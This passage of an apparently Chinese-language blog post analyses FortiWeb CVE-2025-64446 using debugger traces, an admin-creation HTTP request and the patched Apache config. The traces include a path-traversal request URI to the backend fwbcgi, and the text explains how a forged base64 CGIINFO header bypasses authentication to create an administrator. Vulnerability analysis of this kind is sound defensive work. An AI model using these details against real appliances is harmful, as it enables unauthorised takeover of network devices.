class="line">05:0028│     0x7ffe239fa9c8 —▸ 0x7ffe239fcb6d ◂— <span class="string">&#x27;HTTPS=on&#x27;</span></span><br><span class="line">06:0030│     0x7ffe239fa9d0 —▸ 0x7ffe239fcb76 ◂— <span class="string">&#x27;HTTP_HOST=192.168.139.147&#x27;</span></span><br><span class="line">07:0038│     0x7ffe239fa9d8 —▸ 0x7ffe239fcb90 ◂— <span class="string">&#x27;HTTP_SEC_CH_UA_PLATFORM=&quot;Windows&quot;&#x27;</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│  0x7ffe239fa9e0 —▸ 0x7ffe239fcbb2 ◂— <span class="string">&#x27;HTTP_ACCEPT_LANGUAGE=zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">09:0048│  0x7ffe239fa9e8 —▸ 0x7ffe239fcbd6 ◂— <span class="string">&#x27;HTTP_ACCEPT=application/json, text/plain, */*&#x27;</span></span><br><span class="line">0a:0050│  0x7ffe239fa9f0 —▸ 0x7ffe239fcc04 ◂— <span class="string">&#x27;HTTP_SEC_CH_UA=&quot;Not_A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;142&quot;&#x27;</span></span><br><span class="line">0b:0058│  0x7ffe239fa9f8 —▸ 0x7ffe239fcc3c ◂— <span class="string">&#x27;HTTP_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">0c:0060│  0x7ffe239faa00 —▸ 0x7ffe239fccbc ◂— <span class="string">&#x27;HTTP_SEC_CH_UA_MOBILE=?0&#x27;</span></span><br><span class="line">0d:0068│  0x7ffe239faa08 —▸ 0x7ffe239fccd5 ◂— <span class="string">&#x27;HTTP_SEC_FETCH_SITE=same-origin&#x27;</span></span><br><span class="line">0e:0070│  0x7ffe239faa10 —▸ 0x7ffe239fccf5 ◂— <span class="string">&#x27;HTTP_SEC_FETCH_MODE=cors&#x27;</span></span><br><span class="line">0f:0078│  0x7ffe239faa18 —▸ 0x7ffe239fcd0e ◂— <span class="string">&#x27;HTTP_SEC_FETCH_DEST=empty&#x27;</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line">10:0080│  0x7ffe239faa20 —▸ 0x7ffe239fcd28 ◂— <span class="string">&#x27;HTTP_REFERER=https://192.168.139.147/root/system/dashboard/1&#x27;</span></span><br><span class="line">11:0088│  0x7ffe239faa28 —▸ 0x7ffe239fcd65 ◂— <span class="string">&#x27;HTTP_ACCEPT_ENCODING=gzip, deflate, br&#x27;</span></span><br><span class="line">12:0090│  0x7ffe239faa30 —▸ 0x7ffe239fcd8c ◂— <span class="string">&#x27;HTTP_PRIORITY=u=1, i&#x27;</span></span><br><span class="line">13:0098│  0x7ffe239faa38 —▸ 0x7ffe239fcda1 ◂— <span class="string">&#x27;HTTP_CONNECTION=keep-alive&#x27;</span></span><br><span class="line">14:00a0│  0x7ffe239faa40 —▸ 0x7ffe239fcdbc ◂— <span class="string">&#x27;PATH=/bin:/data/bin&#x27;</span></span><br><span class="line">15:00a8│  0x7ffe239faa48 —▸ 0x7ffe239fcdd0 ◂— <span class="string">&#x27;PYTHONHOME=/&#x27;</span></span><br><span class="line">16:00b0│  0x7ffe239faa50 —▸ 0x7ffe239fcddd ◂— <span class="string">&#x27;SERVER_SIGNATURE=&#x27;</span></span><br><span class="line">17:00b8│  0x7ffe239faa58 —▸ 0x7ffe239fcdef ◂— <span class="string">&#x27;SERVER_SOFTWARE=xxxxxxx&#x27;</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line">18:00c0│  0x7ffe239faa60 —▸ 0x7ffe239fce07 ◂— <span class="string">&#x27;SERVER_NAME=192.168.139.147&#x27;</span></span><br><span class="line">19:00c8│  0x7ffe239faa68 —▸ 0x7ffe239fce23 ◂— <span class="string">&#x27;SERVER_ADDR=192.168.139.147&#x27;</span></span><br><span class="line">1a:00d0│  0x7ffe239faa70 —▸ 0x7ffe239fce3f ◂— <span class="string">&#x27;SERVER_PORT=43&#x27;</span></span><br><span class="line">1b:00d8│  0x7ffe239faa78 —▸ 0x7ffe239fce4e ◂— <span class="string">&#x27;REMOTE_ADDR=192.168.139.1&#x27;</span></span><br><span class="line">1c:00e0│  0x7ffe239faa80 —▸ 0x7ffe239fce68 ◂— <span class="string">&#x27;DOCUMENT_ROOT=/migadmin/new_gui&#x27;</span></span><br><span class="line">1d:00e8│  0x7ffe239faa88 —▸ 0x7ffe239fce88 ◂— <span class="string">&#x27;REQUEST_SCHEME=https&#x27;</span></span><br><span class="line">1e:00f0│  0x7ffe239faa90 —▸ 0x7ffe239fce9d ◂— <span class="string">&#x27;CONTEXT_PREFIX=/cgi-bin/&#x27;</span></span><br><span class="line">1f:00f8│  0x7ffe239faa98 —▸ 0x7ffe239fceb6 ◂— <span class="string">&#x27;CONTEXT_DOCUMENT_ROOT=/migadmin/cgi-bin/&#x27;</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line">20:0100│  0x7ffe239faaa0 —▸ 0x7ffe239fcedf ◂— <span class="string">&#x27;SERVER_ADMIN=support@fortinet.com&#x27;</span></span><br><span class="line">21:0108│  0x7ffe239faaa8 —▸ 0x7ffe239fcf01 ◂— <span class="string">&#x27;SCRIPT_FILENAME=/migadmin/cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">22:0110│  0x7ffe239faab0 —▸ 0x7ffe239fcf2a ◂— <span class="string">&#x27;REMOTE_PORT=22761&#x27;</span></span><br><span class="line">23:0118│  0x7ffe239faab8 —▸ 0x7ffe239fcf3c ◂— <span class="string">&#x27;GATEWAY_INTERFACE=CGI/1.1&#x27;</span></span><br><span class="line">24:0120│  0x7ffe239faac0 —▸ 0x7ffe239fcf56 ◂— <span class="string">&#x27;SERVER_PROTOCOL=HTTP/1.1&#x27;</span></span><br><span class="line">25:0128│  0x7ffe239faac8 —▸ 0x7ffe239fcf6f ◂— <span class="string">&#x27;REQUEST_METHOD=GET&#x27;</span></span><br><span class="line">26:0130│  0x7ffe239faad0 —▸ 0x7ffe239fcf82 ◂— <span class="string">&#x27;QUERY_STRING=&#x27;</span></span><br><span class="line">27:0138│  0x7ffe239faad8 —▸ 0x7ffe239fcf90 ◂— <span class="string">&#x27;REQUEST_URI=/api/v2.0/cmdb/../../../cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line">28:0140│  0x7ffe239faae0 —▸ 0x7ffe239fcfc3 ◂— <span class="string">&#x27;SCRIPT_NAME=/cgi-bin/fwbcgi&#x27;</span></span><br></pre></td></tr></table></figure>

<p>正常情况下创建一个用户：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v2.0/cmdb/system/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.139.147</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>APSCOOKIE_VDOM_8672793038565212270=root; APSCOOKIE_FWEB_8672793038565212270=Era=0&amp;Payload=VtyWFEH3vAxtE+LI5DcmIAxsGfMA4P0X7Rz63UyJKtV6qsIIOQIZOjELgcIunzM4%0avPKixbmZ03S1yfyM7UOcyvlJUj2RYzfG7Qzpt9OA2kD6qYDFDcz6WA==%0a&amp;AuthHash=mLVwSfvYUonYIpisPfyjsSVB3nE=%0a</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>545</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">X-Csrftoken</span><span class="punctuation">: </span>1254964471</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Not_A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;142&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://192.168.139.147</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://192.168.139.147/root/system/admin/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;data&quot;:&#123;&quot;q_type&quot;:<span class="number">1</span>,&quot;name&quot;:&quot;debug&quot;,&quot;access-profile&quot;:&quot;prof_admin&quot;,&quot;access-profile_val&quot;:&quot;0&quot;,&quot;trusthostv4&quot;:&quot;0.0.0.0/0 &quot;,&quot;trusthostv6&quot;:&quot;::/0 &quot;,&quot;last-name&quot;:&quot;&quot;,&quot;first-name&quot;:&quot;&quot;,&quot;email-address&quot;:&quot;&quot;,&quot;phone-number&quot;:&quot;&quot;,&quot;mobile-number&quot;:&quot;&quot;,&quot;hidden&quot;:<span class="number">0</span>,&quot;domains&quot;:&quot;root&quot;,&quot;sz_dashboard&quot;:<span class="number">-1</span>,&quot;sz_gui-dashboard&quot;:<span class="number">-1</span>,&quot;type&quot;:&quot;local-user&quot;,&quot;type_val&quot;:&quot;0&quot;,&quot;admin-usergrp_val&quot;:&quot;0&quot;,&quot;wildcard_val&quot;:&quot;0&quot;,&quot;accprofile-override_val&quot;:&quot;0&quot;,&quot;sshkey&quot;:&quot;&quot;,&quot;passwd-set-time&quot;:<span class="number">0</span>,&quot;history-password-pos&quot;:<span class="number">0</span>,&quot;force-password-change&quot;:&quot;disable&quot;,&quot;force-password-change_val&quot;:&quot;0&quot;,&quot;password&quot;:&quot;debug&quot;&#125;&#125;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="language-pgsql"><span class="type">Date</span>: Tue, <span class="number">25</span> Nov <span class="number">2025</span> <span class="number">04</span>:<span class="number">46</span>:<span class="number">30</span> GMT</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">Cache</span>-Control: no-<span class="keyword">cache</span>, no-store, must-revalidate</span></span><br><span class="line"><span class="language-pgsql">Pragma: no-<span class="keyword">cache</span></span></span><br><span class="line"><span class="language-pgsql">Set-Cookie: APSCOOKIE_FWEB_8672793038565212270=Era=<span class="number">0</span>&amp;Payload=VtyWFEH3vAwIVBRlSIWlSLgisjwtYnjaC+F/srj9cnvHSs/+vrvD4zdVOCiwbEhu%<span class="number">0</span>avlwrzQaeiMokfkrND+jm9hAKU6aFaVUTA+<span class="number">8</span>xQ8/S0gqptU69ZIsPJA==%<span class="number">0</span>a&amp;AuthHash=lgQBD41oFh+IaUBolRxVXGkOjfA=%<span class="number">0</span>a; <span class="type">path</span>=/; secure; HttpOnly; SameSite=<span class="keyword">Strict</span></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">Strict</span>-Transport-<span class="keyword">Security</span>: max-age=<span class="number">31536000</span>; includeSubDomains; preload</span></span><br><span class="line"><span class="language-pgsql">X-Frame-<span class="keyword">Options</span>: SAMEORIGIN</span></span><br><span class="line"><span class="language-pgsql">X-XSS-Protection: <span class="number">1</span>; mode=block</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Security</span>-<span class="keyword">Policy</span>: Script-Src <span class="string">&#x27;self&#x27;</span>, frame-ancestors <span class="string">&#x27;self&#x27;</span>; <span class="keyword">Object</span>-Src <span class="string">&#x27;self&#x27;</span>; base-uri <span class="string">&#x27;self&#x27;</span>;</span></span><br><span class="line"><span class="language-pgsql">X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span>: nosniff</span></span><br><span class="line"><span class="language-pgsql">Content-Length: <span class="number">1070</span></span></span><br><span class="line"><span class="language-pgsql">Keep-Alive: timeout=<span class="number">5</span>, max=<span class="number">100</span></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">Connection</span>: Keep-Alive</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&#123; &quot;results&quot;: &#123; &quot;can_view&quot;: <span class="number">0</span>, &quot;q_ref&quot;: <span class="number">0</span>, &quot;can_clone&quot;: <span class="number">1</span>, &quot;q_type&quot;: <span class="number">1</span>, &quot;name&quot;: &quot;debug&quot;, &quot;access-profile&quot;: &quot;prof_admin&quot;, &quot;access-profile_val&quot;: &quot;983&quot;, &quot;trusthostv4&quot;: &quot;0.0.0.0\/0 &quot;, &quot;trusthostv6&quot;: &quot;::\/0 &quot;, &quot;last-name&quot;: &quot;&quot;, &quot;first-name&quot;: &quot;&quot;, &quot;email-address&quot;: &quot;&quot;, &quot;phone-number&quot;: &quot;&quot;, &quot;mobile-number&quot;: &quot;&quot;, &quot;hidden&quot;: <span class="number">0</span>, &quot;domains&quot;: &quot;root &quot;, &quot;sz_dashboard&quot;: <span class="number">8</span>, &quot;sz_gui-dashboard&quot;: <span class="number">7</span>, &quot;type&quot;: &quot;local-user&quot;, &quot;type_val&quot;: &quot;0&quot;, &quot;admin-usergrp&quot;: &quot;&quot;, &quot;admin-usergrp_val&quot;: &quot;0&quot;, &quot;password&quot;: &quot;ENC XXXX&quot;, &quot;wildcard&quot;: &quot;disable&quot;, &quot;wildcard_val&quot;: &quot;0&quot;, &quot;accprofile-override&quot;: &quot;disable&quot;, &quot;accprofile-override_val&quot;: &quot;0&quot;, &quot;sshkey&quot;: &quot;&quot;, &quot;passwd-set-time&quot;: <span class="number">1764045990</span>, &quot;history-password-pos&quot;: <span class="number">1</span>, &quot;history-password0&quot;: &quot;ENC XXXX&quot;, &quot;history-password1&quot;: &quot;ENC XXXX&quot;, &quot;history-password2&quot;: &quot;ENC XXXX&quot;, &quot;history-password3&quot;: &quot;ENC XXXX&quot;, &quot;history-password4&quot;: &quot;ENC XXXX&quot;, &quot;history-password5&quot;: &quot;ENC XXXX&quot;, &quot;history-password6&quot;: &quot;ENC XXXX&quot;, &quot;history-password7&quot;: &quot;ENC XXXX&quot;, &quot;history-password8&quot;: &quot;ENC XXXX&quot;, &quot;history-password9&quot;: &quot;ENC XXXX&quot;, &quot;force-password-change&quot;: &quot;disable&quot;, &quot;force-password-change_val&quot;: &quot;0&quot; &#125; &#125;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>

<p>再次审查<code>/api/v2.0/</code>回调函数sub_630990：<br><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251125142508.png"></p>
<p><em>在将请求转发到<code>/cgi-bin/fwbcgi</code>之前会从cookie中获取操作用户的关键凭证即username、profname、vdom、loginname，转为json并base64编码作为HTTP_CGIINFO头部成员。</em></p>
<p>对<code>ap_internal_redirect</code>下断点：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x00000000004fa080 <span class="keyword">in</span> ap_internal_redirect ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x1ca82ff ◂— 0x1caa67000</span><br><span class="line">*RBX  0x7fff303801c0 ◂— <span class="string">&#x27;&#123; &quot;username&quot;: &quot;admin&quot;, &quot;profname&quot;: &quot;prof_admin&quot;, &quot;vdom&quot;: &quot;root&quot;, &quot;loginname&quot;: &quot;admin&quot;, &quot;session_id&quot;: &quot;886723341&quot; &#125;&#x27;</span></span><br><span class="line">*RCX  0x13</span><br><span class="line">*RDX  0x1ca92c0 ◂— <span class="string">&#x27;/api/v2.0/cmdb/system/admin&#x27;</span></span><br><span class="line">*RDI  0x69490e ◂— <span class="string">&#x27;/cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">*RSI  0x1ca7bf0 —▸ 0x1ca7b78 —▸ 0x1c54768 —▸ 0x1c50748 —▸ 0x17db048 ◂— ...</span><br><span class="line">*R8   0x1c82201 ◂— <span class="string">&#x27;Dg2NzIzMzQxIiB9&#x27;</span></span><br><span class="line">*R9   0x7f6a50d1d467 (__memcpy_ssse3+3895) ◂— movaps xmm2, xmmword ptr [rsi - 0x18]</span><br><span class="line">*R10  0x6c4e586469417965 (<span class="string">&#x27;eyAidXNl&#x27;</span>)</span><br><span class="line">*R11  0x6955576268356d63 (<span class="string">&#x27;cm5hbWUi&#x27;</span>)</span><br><span class="line">*R12  0</span><br><span class="line">*R13  0x1974f40 —▸ 0x1c85990 ◂— 0</span><br><span class="line">*R14  0x7fff303802c0 ◂— <span class="string">&#x27;eyAidXNlcm5hbWUiOiAiYWRtaW4iLCAicHJvZm5hbWUiOiAicHJvZl9hZG1pbiIsICJ2ZG9tIjogInJvb3QiLCAibG9naW5uYW1lIjogImFkbWluIiwgInNlc3Npb25faWQiOiAiODg2NzIzMzQxIiB9&#x27;</span></span><br><span class="line">*R15  0x7fff303800c0 ◂— 0x746f6f72 /* <span class="string">&#x27;root&#x27;</span> */</span><br><span class="line">*RBP  0x1ca7bf0 —▸ 0x1ca7b78 —▸ 0x1c54768 —▸ 0x1c50748 —▸ 0x17db048 ◂— ...</span><br><span class="line">*RSP  0x7fff3037fbc8 —▸ 0x63169f ◂— jmp 0x630eb7</span><br><span class="line">*RIP  0x4fa080 (ap_internal_redirect) ◂— push rbp：</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  0x00000000004fa080 in ap_internal_redirect ()</span></span><br><span class="line"><span class="comment">#1  0x000000000063169f in ?? ()</span></span><br><span class="line"><span class="comment">#2  0x000000000044be40 in ap_run_handler ()</span></span><br><span class="line"><span class="comment">#3  0x000000000044c636 in ap_invoke_handler ()</span></span><br><span class="line"><span class="comment">#4  0x00000000004f936b in ap_process_async_request ()</span></span><br><span class="line"><span class="comment">#5  0x00000000004f953e in ap_process_request ()</span></span><br><span class="line"><span class="comment">#6  0x00000000004f1aac in ?? ()</span></span><br><span class="line"><span class="comment">#7  0x0000000000474260 in ap_run_process_connection ()</span></span><br><span class="line"><span class="comment">#8  0x0000000000639769 in ?? ()</span></span><br><span class="line"><span class="comment">#9  0x0000000000639a2f in ?? ()</span></span><br><span class="line"><span class="comment">#10 0x0000000000639c28 in ?? ()</span></span><br><span class="line"><span class="comment">#11 0x000000000063a264 in ?? ()</span></span><br><span class="line"><span class="comment">#12 0x0000000000474bb0 in ap_run_mpm ()</span></span><br><span class="line"><span class="comment">#13 0x0000000000441b3f in main ()</span></span><br><span class="line"><span class="comment">#14 0x00007f6a50c0cd0b in __libc_start_main () from target:/lib64/libc.so.6</span></span><br><span class="line"><span class="comment">#15 0x0000000000441cca in _start ()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合<code>fwbcgi</code>鉴权逻辑在<code>cgi_auth</code>中其实只是提取<code>HTTP_CGIINFO</code>进行校验而没有涉及cookie字段，然后直接调用cgi_process后端具体实现：<br><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251125143311.png"><br>所以由于配置问题导致关键后端CGI暴露，user可以未授权访问fwbcgi并且伪造CGIINFO绕过鉴权，可以实现相当于授权状态下对各种<code>/api/v2.0/</code>开头的API功能访问，其中包括<code>/api/v2.0/cmdb/system/admin</code>创建用户。</p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251125144205.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 默认拒绝所有文件</span><br><span class="line">  &lt;Files &quot;*&quot;&gt;</span><br><span class="line">      Require all denied</span><br><span class="line">  &lt;/Files&gt;</span><br><span class="line"># 特定文件的内部访问控制（关键部分）</span><br><span class="line">  &lt;Files &quot;fwbcgi&quot;&gt;</span><br><span class="line">      SetEnvIf REDIRECT_STATUS 200 is_internal</span><br><span class="line">	      #- SetEnvIf：根据条件设置环境变量</span><br><span class="line">		  #- REDIRECT_STATUS：Apache 内部重定向时设置的环境变量</span><br><span class="line">		  #- 200：HTTP 状态码 200（成功）</span><br><span class="line">		  #- is_internal：如果 REDIRECT_STATUS 等于 200，则设置环境变量 is_internal</span><br><span class="line">      Require env is_internal</span><br><span class="line">		  #- 要求环境变量 is_internal 必须存在</span><br><span class="line">		  #- 只有内部重定向的请求才能访问</span><br><span class="line">  &lt;/Files&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/squarepants0">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-64446"><span class="toc-number">3.</span> <span class="toc-text">CVE-2025-64446</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">3.1.</span> <span class="toc-text">Patch</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=FortiWeb CVE-2025-64446漏洞分析&body=Check out this article: http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=FortiWeb CVE-2025-64446漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    SquareR
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/squarepants0">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



